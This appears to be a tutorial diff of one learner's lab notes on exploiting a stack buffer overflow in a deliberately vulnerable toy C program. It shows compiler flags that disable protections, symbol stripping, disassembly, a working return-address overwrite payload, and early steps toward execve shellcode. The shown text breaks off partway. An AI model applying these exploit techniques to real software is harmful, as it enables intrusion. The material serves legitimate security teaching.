@@ -1,0 +1,1402 @@
+/-------------- your editor should be this wide ------------------------------------------------------/
+
+
+STEP 1 Looking at our results so far
+----------------------------------------------------------
+
+Our goal is to exploit the buffer overflow to get a shell.
+ie. rather than alter the program flow with flawed input so
+that it calls an unintended routine. We want to use flawed 
+input to actually replace the program with a command line
+shell.
+
+Before we start work on that lets quickly review what we have so far.
+
+This stage rewrites the makefile so you can test some mods.  By default
+all the compiler flags are enabled.  Building the code like so includes
+some things not needed by for what we have done so far.
+
+Building the code with all the options enabled
+
+[davis@vm-i386 progs]$ make
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c buffer_overflow.c -o buffer_overflow.o
+gcc -ggdb  -o buffer_overflow buffer_overflow.o
+[davis@vm-i386 progs]$ 
+
+We know we can debug it since it has symbols.  What are symbols though? Let's take a look
+and see.
+
+Run the strings program on the program. It will show the strings in the binary elf
+file.
+[davis@vm-i386 progs]$ strings buffer_overflow | less
+(This result is truncated.)
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+strcpy
+exit
+puts
+printf
+__libc_start_main
+__gmon_start__
+GLIBC_2.0
+PTRh
+UWVS
+t$,U
+[^_]
+I should never be called.
+argv[1] = %s
+;*2$"
+GCC: (GNU) 5.2.0
+GCC: (GNU) 5.3.0
+buffer_overflow.c
+long long int
+buffer_overflow.c
+main
+long long unsigned int
+vulnerable
+...
+
+
+Hmm, it includes things like our text which we have for printf. ie. "I should never be called."
+and some things which look like compiler and dynamic loader info.  I don't see anything related
+to program flow.  How many lines of output are in here anyway?
+
+[davis@vm-i386 progs]$ strings buffer_overflow | wc -l
+112
+
+Ok, lets try to strip the code of debug symbols and see what happens.
+
+[davis@vm-i386 progs]$ make stripdebug
+strip --strip-debug buffer_overflow
+[davis@vm-i386 progs]$ strings buffer_overflow | wc -l
+88
+
+Hmm. It got rid of some of the text.  What did it remove?  We need to build
+the code again to get the original form.
+
+[davis@vm-i386 progs]$ make
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c simpleprog.c -o simpleprog.o
+gcc -ggdb  -o simpleprog simpleprog.o
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c buffer_overflow.c -o buffer_overflow.o
+gcc -ggdb  -o buffer_overflow buffer_overflow.o
+[davis@vm-i386 progs]$ strings buffer_overflow > withdebug.txt
+[davis@vm-i386 progs]$ make stripdebug
+strip --strip-debug buffer_overflow
+[davis@vm-i386 progs]$ strings buffer_overflow > withoutdebug.txt
+
+[davis@vm-i386 progs]$ diff -Naur withdebug.txt withoutdebug.txt | less
+(this result is truncated.)
+--- withdebug.txt       2016-01-30 10:43:47.340825046 -0500
++++ withoutdebug.txt    2016-01-30 10:43:58.604148242 -0500
+@@ -17,22 +17,6 @@
+ ;*2$"
+ GCC: (GNU) 5.2.0
+ GCC: (GNU) 5.3.0
+-buffer_overflow.c
+-long long int
+-buffer_overflow.c
+-main
+-long long unsigned int
+-vulnerable
+-unsigned char
+-nevercalled
+-argv
+-argc
+-short unsigned int
+-GNU C11 5.3.0 -mtune=generic -march=pentiumpro -ggdb -O0 -fno-stack-protector
+-/home/davis/progs
+-short int
+-buffer
+-sizetype
+ .symtab
+ .strtab
+ .shstrtab
+@@ -61,13 +45,6 @@
+ .data
+ .bss
+ .comment
+-.debug_aranges
+-.debug_info
+-.debug_abbrev
+-.debug_line
+-.debug_str
+-init.c
+-crtstuff.c
+...
+
+Hmm, it removed some names which look likes section info, compiler flags, etc.  What does it
+look like in gdb?  Will my buffer overflow still work?
+
+Let's try gdb
+
+Well indeed the program source is gone, but I still see my function call names.  My breakpoint
+in main still worked.
+
+   ┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                               [ No Source Available ]                                              │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   ┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
+   │0x80484d1 <main+11>     mov    %esp,%ebp                                                            │
+   │0x80484d3 <main+13>     push   %ebx                                                                 │
+   │0x80484d4 <main+14>     push   %ecx                                                                 │
+B+ │0x80484d5 <main+15>     mov    %ecx,%ebx                                                            │
+  >│0x80484d7 <main+17>     mov    0x4(%ebx),%eax                                                       │
+   │0x80484da <main+20>     add    $0x4,%eax                                                            │
+   │0x80484dd <main+23>     mov    (%eax),%eax                                                          │
+   │0x80484df <main+25>     sub    $0xc,%esp                                                            │
+   │0x80484e2 <main+28>     push   %eax                                                                 │
+   │0x80484e3 <main+29>     call   0x80484ab <vulnerable>                                               │
+   │0x80484e8 <main+34>     add    $0x10,%esp                                                           │
+   │0x80484eb <main+37>     mov    0x4(%ebx),%eax                                                       │
+   │0x80484ee <main+40>     add    $0x4,%eax                                                            │
+   └────────────────────────────────────────────────────────────────────────────────────────────────────┘
+native process 490 In: main                                                          L??   PC: 0x80484d7 
+[Inferior 1 (process 489) exited normally]
+Breakpoint 1 at 0x80484d5
+(gdb) break main
+Note: breakpoint 1 also set at pc 0x80484d5.
+Breakpoint 2 at 0x80484d5
+(gdb) run
+Starting program: /home/davis/progs/buffer_overflow "AAAABBBBCCCC" > outfile.txt
+
+Breakpoint 1, 0x080484d5 in main ()
+(gdb) layout next
+(gdb) layout next
+(gdb) stepi
+0x080484d7 in main ()
+(gdb) 
+
+I wonder if the code will still exploit.
+
+[davis@vm-i386 progs]$ make test
+./buffer_overflow `printf "AAAABBBBCCCCDDDDEEEEFF\x8b\x84\x04\x08"`
+I should never be called.
+
+Yeap, it still does.  So what happens if I strip all?
+
+[davis@vm-i386 progs]$ make stripall
+strip --strip-all buffer_overflow
+[davis@vm-i386 progs]$ make test
+./buffer_overflow `printf "AAAABBBBCCCCDDDDEEEEFF\x8b\x84\x04\x08"`
+I should never be called.
+[davis@vm-i386 progs]$ ./buffer_overflow `printf "AAAABBB"`
+argv[1] = AAAABBB
+[davis@vm-i386 progs]$ ./buffer_overflow AAAABBBB
+argv[1] = AAAABBBB
+[davis@vm-i386 progs]$ 
+
+Hmm. So it did not change the program flow or offsets.  What does it look like in gdb?
+
+   ┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                               [ No Source Available ]                                              │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   │                                                                                                    │
+   └────────────────────────────────────────────────────────────────────────────────────────────────────┘
+native No process In:                                                                       L??   PC: ?? 
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./buffer_overflow...(no debugging symbols found)...done.
+Focus set to CMD window.
+warning: Invalid window specified.
+The window name specified must be valid and visible.
+
+[Inferior 1 (process 505) exited normally]
+warning: Invalid window specified.
+The window name specified must be valid and visible.
+
+[Inferior 1 (process 509) exited normally]
+Function "main" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
+(gdb) 
+
+Whoops. I can no longer break on symbol names. ie main, vulnerable etc are gone.
+
+How about the strings?  What did it remove from the file?
+
+[davis@vm-i386 progs]$ strings buffer_overflow > withoutall.txt
+[davis@vm-i386 progs]$ diff -Naur withoutdebug.txt withoutall.txt | less
+(truncated again)
+--- withoutdebug.txt    2016-01-30 10:43:58.604148242 -0500
++++ withoutall.txt      2016-01-30 10:57:06.860105478 -0500
+@@ -17,8 +17,6 @@
+ ;*2$"
+ GCC: (GNU) 5.2.0
+ GCC: (GNU) 5.3.0
+-.symtab
+-.strtab
+ .shstrtab
+ .interp
+ .note.ABI-tag
+@@ -45,44 +43,3 @@
+ .data
+ .bss
+ .comment
+-__JCR_LIST__
+-deregister_tm_clones
+-register_tm_clones
+-__do_global_dtors_aux
+-completed.6555
+-__do_global_dtors_aux_fini_array_entry
+-frame_dummy
+-__frame_dummy_init_array_entry
+-__FRAME_END__
+-__JCR_END__
+-__init_array_end
+-_DYNAMIC
+-__init_array_start
+-_GLOBAL_OFFSET_TABLE_
+-__libc_csu_fini
+-nevercalled
+-_ITM_deregisterTMCloneTable
+-__x86.get_pc_thunk.bx
+-data_start
+-printf@@GLIBC_2.0
+-_edata
+-_fini
+-strcpy@@GLIBC_2.0
+-__data_start
+-puts@@GLIBC_2.0
+-__gmon_start__
+-exit@@GLIBC_2.0
+
+Well, this make sense.  The .symtab is gone.  Likewise the .strtab.  FWIW, the .symtab is the 
+symbol table.  It contains names to numbers.  ie. main is a function at address x.
+.strtab is likewise for the constant strings.  Ok, lets look at objdump output.
+
+Let's clear the slate and look at the original code.
+
+[davis@vm-i386 progs]$ make clean
+rm -f *.o
+rm simpleprog
+rm buffer_overflow 
+[davis@vm-i386 progs]$ make
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c simpleprog.c -o simpleprog.o
+gcc -ggdb  -o simpleprog simpleprog.o
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c buffer_overflow.c -o buffer_overflow.o
+gcc -ggdb  -o buffer_overflow buffer_overflow.o
+[davis@vm-i386 progs]$ 
+
+[davis@vm-i386 progs]$ objdump --full-contents buffer_overflow | less
+(Not only truncated, but looking at sections out of order)
+
+Here is the read only data
+Contents of section .rodata:
+ 8048598 03000000 01000200 49207368 6f756c64  ........I should
+ 80485a8 206e6576 65722062 65206361 6c6c6564   never be called
+ 80485b8 2e006172 67765b31 5d203d20 25730a00  ..argv[1] = %s..
+
+These are the strings which persist even after you stripall.  Literally
+the constants.  
+
+Here is the debug string section
+Contents of section .debug_str:
+ 0000 6c6f6e67 206c6f6e 6720696e 74006275  long long int.bu
+ 0010 66666572 5f6f7665 72666c6f 772e6300  ffer_overflow.c.
+ 0020 6d61696e 006c6f6e 67206c6f 6e672075  main.long long u
+ 0030 6e736967 6e656420 696e7400 76756c6e  nsigned int.vuln
+ 0040 65726162 6c650075 6e736967 6e656420  erable.unsigned 
+ 0050 63686172 006e6576 65726361 6c6c6564  char.nevercalled
+ 0060 00617267 76006172 67630073 686f7274  .argv.argc.short
+ 0070 20756e73 69676e65 6420696e 7400474e   unsigned int.GN
+ 0080 55204331 3120352e 332e3020 2d6d7475  U C11 5.3.0 -mtu
+ 0090 6e653d67 656e6572 6963202d 6d617263  ne=generic -marc
+ 00a0 683d7065 6e746975 6d70726f 202d6767  h=pentiumpro -gg
+ 00b0 6462202d 4f30202d 666e6f2d 73746163  db -O0 -fno-stac
+ 00c0 6b2d7072 6f746563 746f7200 2f686f6d  k-protector./hom
+ 00d0 652f6461 7669732f 70726f67 73007368  e/davis/progs.sh
+ 00e0 6f727420 696e7400 62756666 65720073  ort int.buffer.s
+ 00f0 697a6574 79706500                    izetype.     
+
+These show the file name, compiler flags, where it was
+compiled etc.
+
+Here is the debug info.  I'm not certain but I believe
+these are the stab strings which the debugger uses
+to resolve line numbers to assembly, type info etc.
+
+Contents of section .debug_info:
+ 0000 0b010000 04000000 00000401 7e000000  ............~...
+ 0010 0c0e0000 00cc0000 008b8404 08880000  ................
+ 0020 00000000 00020407 2f000000 02010847  ......../......G
+ 0030 00000002 02076b00 00000204 072a0000  ......k......*..
+ 0040 00020106 49000000 020205de 00000003  ....I...........
+ 0050 0405696e 74000208 05000000 00020807  ..int...........
+ 0060 25000000 02040505 00000002 0407ef00  %...............
+ 0070 00000404 78000000 02010650 00000005  ....x......P....
+ 0080 55000000 01058b84 04082000 0000019c  U......... .....
+ 0090 063c0000 00010aab 8404081b 00000001  .<..............
+ 00a0 9cc20000 00076172 6700010a 72000000  ......arg...r...
+ 00b0 02910008 e8000000 010bc200 00000291  ................
+ 00c0 66000978 000000d2 0000000a 6b000000  f..x........k...
+ 00d0 09000b20 00000001 0f4f0000 00c68404  ... .....O......
+ 00e0 084d0000 00019c08 0100000c 66000000  .M..........f...
+ 00f0 010f4f00 00000291 000c6100 0000010f  ..O.......a.....
+ 0100 08010000 02910400 04047200 000000    ..........r.... 
+
+Here is the dynamic linker info, we are going to build an
+exe without this in a second.
+
+Contents of section .dynstr:
+ 804822c 006c6962 632e736f 2e36005f 494f5f73  .libc.so.6._IO_s
+ 804823c 7464696e 5f757365 64007374 72637079  tdin_used.strcpy
+ 804824c 00657869 74007075 74730070 72696e74  .exit.puts.print
+ 804825c 66005f5f 6c696263 5f737461 72745f6d  f.__libc_start_m
+ 804826c 61696e00 5f5f676d 6f6e5f73 74617274  ain.__gmon_start
+ 804827c 5f5f0047 4c494243 5f322e30 00        __.GLIBC_2.0.   
+
+The compiler version number
+Contents of section .gnu.version:
+ 804828a 00000200 02000200 00000200 02000100  ................
+
+So lets use objdump to disassemble the routines.
+
+[davis@vm-i386 progs]$ objdump -D buffer_overflow | less
+(stuff truncated)
+
+Here is the main
+080484c6 <main>:
+ 80484c6:       8d 4c 24 04             lea    0x4(%esp),%ecx
+ 80484ca:       83 e4 f0                and    $0xfffffff0,%esp
+ 80484cd:       ff 71 fc                pushl  -0x4(%ecx)
+ 80484d0:       55                      push   %ebp
+ 80484d1:       89 e5                   mov    %esp,%ebp
+ 80484d3:       53                      push   %ebx
+ 80484d4:       51                      push   %ecx
+ 80484d5:       89 cb                   mov    %ecx,%ebx
+ 80484d7:       8b 43 04                mov    0x4(%ebx),%eax
+ 80484da:       83 c0 04                add    $0x4,%eax
+ 80484dd:       8b 00                   mov    (%eax),%eax
+ 80484df:       83 ec 0c                sub    $0xc,%esp
+ 80484e2:       50                      push   %eax
+ 80484e3:       e8 c3 ff ff ff          call   80484ab <vulnerable>
+ 80484e8:       83 c4 10                add    $0x10,%esp
+ 80484eb:       8b 43 04                mov    0x4(%ebx),%eax
+ 80484ee:       83 c0 04                add    $0x4,%eax
+ 80484f1:       8b 00                   mov    (%eax),%eax
+ 80484f3:       83 ec 08                sub    $0x8,%esp
+ 80484f6:       50                      push   %eax
+ 80484f7:       68 ba 85 04 08          push   $0x80485ba
+ 80484fc:       e8 2f fe ff ff          call   8048330 <printf@plt>
+ 8048501:       83 c4 10                add    $0x10,%esp
+ 8048504:       b8 00 00 00 00          mov    $0x0,%eax
+ 8048509:       8d 65 f8                lea    -0x8(%ebp),%esp
+ 804850c:       59                      pop    %ecx
+ 804850d:       5b                      pop    %ebx
+ 804850e:       5d                      pop    %ebp
+ 804850f:       8d 61 fc                lea    -0x4(%ecx),%esp
+ 8048512:       c3                      ret    
+ 8048513:       66 90                   xchg   %ax,%ax
+ 8048515:       66 90                   xchg   %ax,%ax
+ 8048517:       66 90                   xchg   %ax,%ax
+ 8048519:       66 90                   xchg   %ax,%ax
+ 804851b:       66 90                   xchg   %ax,%ax
+ 804851d:       66 90                   xchg   %ax,%ax
+ 804851f:       90                      nop
+
+
+Here are our two functions vulnerable and nevercalled
+
+0804848b <nevercalled>:
+ 804848b:       55                      push   %ebp
+ 804848c:       89 e5                   mov    %esp,%ebp
+ 804848e:       83 ec 08                sub    $0x8,%esp
+ 8048491:       83 ec 0c                sub    $0xc,%esp
+ 8048494:       68 a0 85 04 08          push   $0x80485a0
+ 8048499:       e8 b2 fe ff ff          call   8048350 <puts@plt>
+ 804849e:       83 c4 10                add    $0x10,%esp
+ 80484a1:       83 ec 0c                sub    $0xc,%esp
+ 80484a4:       6a 00                   push   $0x0
+ 80484a6:       e8 c5 fe ff ff          call   8048370 <exit@plt>
+
+080484ab <vulnerable>:
+ 80484ab:       55                      push   %ebp
+ 80484ac:       89 e5                   mov    %esp,%ebp
+ 80484ae:       83 ec 18                sub    $0x18,%esp
+ 80484b1:       83 ec 08                sub    $0x8,%esp
+ 80484b4:       ff 75 08                pushl  0x8(%ebp)
+ 80484b7:       8d 45 ee                lea    -0x12(%ebp),%eax
+ 80484ba:       50                      push   %eax
+ 80484bb:       e8 80 fe ff ff          call   8048340 <strcpy@plt>
+ 80484c0:       83 c4 10                add    $0x10,%esp
+ 80484c3:       90                      nop
+ 80484c4:       c9                      leave  
+ 80484c5:       c3                      ret    
+
+Notice the address for vulnerable which we hooked.
+
+Now lets strip all and see if we can find these same routines.
+<stuff truncated and out of order again>
+
+08048380 <__libc_start_main@plt>:
+ 8048380:       ff 25 2c 98 04 08       jmp    *0x804982c
+ 8048386:       68 28 00 00 00          push   $0x28
+ 804838b:       e9 90 ff ff ff          jmp    8048320 <printf@plt-0x10>
+
+Disassembly of section .text:
+
+08048390 <.text>:
+ 8048390:       31 ed                   xor    %ebp,%ebp
+ 8048392:       5e                      pop    %esi
+ 8048393:       89 e1                   mov    %esp,%ecx
+ 8048395:       83 e4 f0                and    $0xfffffff0,%esp
+ 8048398:       50                      push   %eax
+ 8048399:       54                      push   %esp
+ 804839a:       52                      push   %edx
+ 804839b:       68 80 85 04 08          push   $0x8048580
+ 80483a0:       68 20 85 04 08          push   $0x8048520
+ 80483a5:       51                      push   %ecx
+ 80483a6:       56                      push   %esi
+ 80483a7:       68 c6 84 04 08          push   $0x80484c6        <<------------------------
+ 80483ac:       e8 cf ff ff ff          call   8048380 <__libc_start_main@plt>
+ 80483b1:       f4                      hlt    
+
+The .text section is the executable code for an elf file, notice the
+address pushed on stack right before the call to libc_start_main.
+That is the address of our main.  I've noted it with an arrow.
+
+ 80484c6:       8d 4c 24 04             lea    0x4(%esp),%ecx
+ 80484ca:       83 e4 f0                and    $0xfffffff0,%esp
+ 80484cd:       ff 71 fc                pushl  -0x4(%ecx)
+ 80484d0:       55                      push   %ebp
+ 80484d1:       89 e5                   mov    %esp,%ebp
+ 80484d3:       53                      push   %ebx
+ 80484d4:       51                      push   %ecx
+ 80484d5:       89 cb                   mov    %ecx,%ebx
+ 80484d7:       8b 43 04                mov    0x4(%ebx),%eax
+ 80484da:       83 c0 04                add    $0x4,%eax
+ 80484dd:       8b 00                   mov    (%eax),%eax
+ 80484df:       83 ec 0c                sub    $0xc,%esp
+ 80484e2:       50                      push   %eax
+ 80484e3:       e8 c3 ff ff ff          call   80484ab <__libc_start_main@plt+0x12b>   <<-------
+ 80484e8:       83 c4 10                add    $0x10,%esp
+
+Notice the call to address 0x80484ab?  That is our call to vulnerable.
+
+ 80484ab:       55                      push   %ebp
+ 80484ac:       89 e5                   mov    %esp,%ebp
+ 80484ae:       83 ec 18                sub    $0x18,%esp
+ 80484b1:       83 ec 08                sub    $0x8,%esp
+ 80484b4:       ff 75 08                pushl  0x8(%ebp)
+ 80484b7:       8d 45 ee                lea    -0x12(%ebp),%eax
+ 80484ba:       50                      push   %eax
+ 80484bb:       e8 80 fe ff ff          call   8048340 <strcpy@plt>   <<---------------
+ 80484c0:       83 c4 10                add    $0x10,%esp
+ 80484c3:       90                      nop
+ 80484c4:       c9                      leave  
+ 80484c5:       c3                      ret    
+
+Notice the call to strcpy in the vulnerable function?  That is where 
+we did our buffer overflow.
+
+Anyway, one last thing.  This code uses dynamic libs.  Here is some quick info
+on that.  I'm going to rebuild it again with defaults.
+
+[davis@vm-i386 progs]$ make clean
+rm -f *.o
+mrm simpleprog
+rm buffer_overflow 
+[davis@vm-i386 progs]$ make
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c simpleprog.c -o simpleprog.o
+gcc -ggdb  -o simpleprog simpleprog.o
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c buffer_overflow.c -o buffer_overflow.o
+gcc -ggdb  -o buffer_overflow buffer_overflow.o
+[davis@vm-i386 progs]$ 
+
+[davis@vm-i386 progs]$ ls -lh buffer_overflow
+-rwxr-xr-x 1 davis davis 6.5K Jan 30 11:32 buffer_overflow
+[davis@vm-i386 progs]$ ldd buffer_overflow
+        linux-gate.so.1 (0xb7786000)
+        libc.so.6 => /usr/lib/libc.so.6 (0xb75c2000)
+        /lib/ld-linux.so.2 (0xb7787000)
+[davis@vm-i386 progs]$ 
+
+This program is less than 7KB in size and uses some runtime libraries.  We are going to change
+that in a moment.  This is done so that the routines like printf, strcpy etc are not included
+in the buffer_overflow exe.  They instead are used at runtime via the libc.so.6.  I believe
+the other two libs there are for assistance in finding those symbols. Not sure really.
+
+One last thing, lets see what happens if we remove a few of these compiler options.
+You can tweak the makefile so that only the gdb options are enabled.
+
+<makefile edit looks like this>
+# No optimization and include debug info with gdb improvements.
+C_FLAGS_0 = -O0 -ggdb 
+# Stack protection disable
+#C_FLAGS_1 = -fno-stack-protector 
+# Executable stack
+#C_FLAGS_2 = -z execstack 
+
+
+[davis@vm-i386 progs]$ make
+gcc  -DNORMAL -O0 -ggdb     -c simpleprog.c -o simpleprog.o
+gcc -ggdb  -o simpleprog simpleprog.o
+gcc  -DNORMAL -O0 -ggdb     -c buffer_overflow.c -o buffer_overflow.o
+gcc -ggdb  -o buffer_overflow buffer_overflow.o
+[davis@vm-i386 progs]$ make test
+./buffer_overflow `printf "AAAABBBBCCCCDDDDEEEEFF\x8b\x84\x04\x08"`
+I should never be called.
+[davis@vm-i386 progs]$ 
+
+Hmm, lol. I thought the -fno-stack-protector was going to be required.
+I guess not.  I'm pretty sure it will be needed when we do our shell code 
+though.
+
+Ok, one last thing.  Let's change the code to be static instead of dynamic 
+linking.
+
+[davis@vm-i386 progs]$ make
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c simpleprog.c -o simpleprog.o
+gcc -ggdb -static -o simpleprog simpleprog.o
+gcc  -DNORMAL -O0 -ggdb  -fno-stack-protector  -z execstack   -c buffer_overflow.c -o buffer_overflow.o
+gcc -ggdb -static -o buffer_overflow buffer_overflow.o
+[davis@vm-i386 progs]$ ldd buffer_overflow
+        not a dynamic executable
+[davis@vm-i386 progs]$ ls -lh buffer_overflow
+-rwxr-xr-x 1 davis davis 721K Jan 30 12:13 buffer_overflow
+
+Now, when you step through the code the strcpy routine will actually
+be in the current executable rather than in a seperate module.  Also
+the code running in the symbol table to find the routine will
+no longer be there.  I'll leave it to you to see the difference.
+
+
+STEP 1 Learn how to get a shell via a buffer overflow.
+----------------------------------------------------------
+(
+This section is greatly lifted from this source:
+http://www.cs.umd.edu/class/fall2012/cmsc498L/materials/vuln-lab.shtml
+)
+
+So what does a shell look like when executed in a program?  
+
+Here is some code: simpleprog.c
+
+#include <unistd.h> // For execl
+
+int main(void) {
+    execl("/bin/sh", "", NULL);
+}
+
+What does it do when its run?
+
+[davis@vm-i386 progs]$ ps --forest
+  PID TTY          TIME CMD
+  329 pts/0    00:00:04 bash
+  744 pts/0    00:00:00  \_ ps
+[davis@vm-i386 progs]$ ./simpleprog 
+[davis@vm-i386 progs]$ ps --forest
+  PID TTY          TIME CMD
+  329 pts/0    00:00:04 bash
+  745 pts/0    00:00:00  \_ sh
+  746 pts/0    00:00:00      \_ ps
+[davis@vm-i386 progs]$ exit
+exit
+[davis@vm-i386 progs]$ ps --forest
+  PID TTY          TIME CMD
+  329 pts/0    00:00:04 bash
+  747 pts/0    00:00:00  \_ ps
+[davis@vm-i386 progs]$ 
+
+So, it simply creates a subshell.  Replace the args to the exec system
+call with "/bin/ls" and the program will run the ls command instead. 
+
+Anywho, we don't want to write this code by hand nor pull an assember
+so we will simply use the dissassembler to see how to do a shell.
+
+[davis@vm-i386 progs]$ objdump -D simpleprog | less
+<stuff truncated>
+
+080488ac <main>:
+ 80488ac:       8d 4c 24 04             lea    0x4(%esp),%ecx
+ 80488b0:       83 e4 f0                and    $0xfffffff0,%esp
+ 80488b3:       ff 71 fc                pushl  -0x4(%ecx)
+ 80488b6:       55                      push   %ebp
+ 80488b7:       89 e5                   mov    %esp,%ebp
+ 80488b9:       51                      push   %ecx
+ 80488ba:       83 ec 04                sub    $0x4,%esp
+ 80488bd:       83 ec 04                sub    $0x4,%esp
+ 80488c0:       6a 00                   push   $0x0
+ 80488c2:       68 08 c6 0b 08          push   $0x80bc608
+ 80488c7:       68 09 c6 0b 08          push   $0x80bc609
+ 80488cc:       e8 7f 3c 02 00          call   806c550 <execl>
+ 80488d1:       83 c4 10                add    $0x10,%esp
+ 80488d4:       b8 00 00 00 00          mov    $0x0,%eax
+ 80488d9:       8b 4d fc                mov    -0x4(%ebp),%ecx
+ 80488dc:       c9                      leave  
+ 80488dd:       8d 61 fc                lea    -0x4(%ecx),%esp
+ 80488e0:       c3                      ret    
+ 80488e1:       66 90                   xchg   %ax,%ax
+ 80488e3:       66 90                   xchg   %ax,%ax
+ 80488e5:       66 90                   xchg   %ax,%ax
+ 80488e7:       66 90                   xchg   %ax,%ax
+ 80488e9:       66 90                   xchg   %ax,%ax
+ 80488eb:       66 90                   xchg   %ax,%ax
+ 80488ed:       66 90                   xchg   %ax,%ax
+ 80488ef:       90                      nop
+
+Notice that main calls execl
+
+
+0806c550 <execl>:
+ 806c550:       55                      push   %ebp
+ 806c551:       57                      push   %edi
+ 806c552:       56                      push   %esi
+ 806c553:       53                      push   %ebx
+ 806c554:       81 ec 1c 10 00 00       sub    $0x101c,%esp
+ 806c55a:       8b 84 24 34 10 00 00    mov    0x1034(%esp),%eax
+ 806c561:       85 c0                   test   %eax,%eax
+ 806c563:       89 44 24 10             mov    %eax,0x10(%esp)
+ 806c567:       0f 84 1c 01 00 00       je     806c689 <execl+0x139>
+ 806c56d:       8d 9c 24 38 10 00 00    lea    0x1038(%esp),%ebx
+...
+ 806c5eb:       ff 35 2c d8 0e 08       pushl  0x80ed82c
+ 806c5f1:       57                      push   %edi
+ 806c5f2:       ff b4 24 3c 10 00 00    pushl  0x103c(%esp)
+ 806c5f9:       e8 f2 49 02 00          call   8090ff0 <__execve>
+ 806c5fe:       83 c4 10                add    $0x10,%esp
+...
+
+Notice that execl calls execve
+
+Hmm. what does man says about these two calls?
+
+From the examples section, 
+
+execl uses program args in the system call.
+	ret = execl ("/bin/ls", "ls", "-1", (char *)0);
+
+The last parm being null ends the list of args.
+
+execve uses program args and program environment in 
+buffers supplied as arguments to the system call.
+           int ret;
+           char *cmd[] = { "ls", "-l", (char *)0 };
+           char *env[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
+           ret = execve ("/bin/ls", cmd, env);
+
+So with that said, lets change the code to use execve instead.  We are trying to get
+the bare essecne of the assembly code for the shell. Really the actual hex instruction
+byte sequence, assembly is sufficent.
+
+Ok, the guide and reality leave a bit of hand waving.  I'll try to explain what's happening.
+The code which we see in disassembly and in the guide are at libc level.
+
+0806c540 <__execve>:
+ 806c540:       53                      push   %ebx
+ 806c541:       8b 54 24 10             mov    0x10(%esp),%edx
+ 806c545:       8b 4c 24 0c             mov    0xc(%esp),%ecx
+ 806c549:       8b 5c 24 08             mov    0x8(%esp),%ebx
+ 806c54d:       b8 0b 00 00 00          mov    $0xb,%eax
+ 806c552:       ff 15 70 ca 0e 08       call   *0x80eca70
+ 806c558:       5b                      pop    %ebx
+ 806c559:       3d 01 f0 ff ff          cmp    $0xfffff001,%eax
+ 806c55e:       0f 83 fc 3c 00 00       jae    8070260 <__syscall_error>
+ 806c564:       c3                      ret    
+ 806c565:       66 90                   xchg   %ax,%ax
+ 806c567:       66 90                   xchg   %ax,%ax
+ 806c569:       66 90                   xchg   %ax,%ax
+ 806c56b:       66 90                   xchg   %ax,%ax
+ 806c56d:       66 90                   xchg   %ax,%ax
+ 806c56f:       90                      nop
+
+The 0x80eca70 is a glibc routine for resolving addresses. It shows up EVERYWHERE.
+
+Here are some samples
+
+getpid
+ 80a6c3c:       b8 14 00 00 00          mov    $0x14,%eax
+ 80a6c41:       ff 15 70 ca 0e 08       call   *0x80eca70
+
+brk
+ 8091155:       b8 2d 00 00 00          mov    $0x2d,%eax
+ 809115a:       ff 15 70 ca 0e 08       call   *0x80eca70
+
+access
+ 8090fda:       b8 21 00 00 00          mov    $0x21,%eax
+ 8090fdf:       ff 15 70 ca 0e 08       call   *0x80eca70
+
+lseek
+ 8090fad:       b8 13 00 00 00          mov    $0x13,%eax
+ 8090fb2:       ff 15 70 ca 0e 08       call   *0x80eca70
+
+
+Look in 
+cat /usr/include/asm/unistd.h 
+which for i386 is in
+cat /usr/include/asm/unistd_32.h 
+
+
+[davis@vm-i386 proc]$ grep leek /usr/include/asm/unistd_32.h 
+[davis@vm-i386 proc]$ grep lseek /usr/include/asm/unistd_32.h 
+#define __NR_lseek 19
+#define __NR__llseek 140
+[davis@vm-i386 proc]$ grep pid /usr/include/asm/unistd_32.h 
+#define __NR_waitpid 7
+#define __NR_getpid 20
+#define __NR_getppid 64
+[davis@vm-i386 proc]$ grep access /usr/include/asm/unistd_32.h 
+#define __NR_access 33
+#define __NR_faccessat 307
+[davis@vm-i386 proc]$ grep exec /usr/include/asm/unistd_32.h 
+#define __NR_execve 11
+#define __NR_kexec_load 283
+#define __NR_execveat 358
+
+See where I am going here?  That call to address 0x80eca70 is 
+a syscall.  Look at the man page in section 2 for syscall.
+Convert the numbers to decimal and they match. ie.
+
+[davis@vm-i386 proc]$ man 2 syscall
+<point of interest>
+      arch/ABI   instruction          syscall #   retval Notes
+       ───────────────────────────────────────────────────────────────────
+       arm/OABI   swi NR               -           a1     NR is syscall #
+       arm/EABI   swi 0x0              r7          r0
+       arm64      svc #0               x8          x0
+       blackfin   excpt 0x0            P0          R0
+       i386       int $0x80            eax         eax
+       ia64       break 0x100000       r15         r8     See below
+       mips       syscall              v0          v0     See below
+       parisc     ble 0x100(%sr2, %r0) r20         r28
+       s390       svc 0                r1          r2     See below
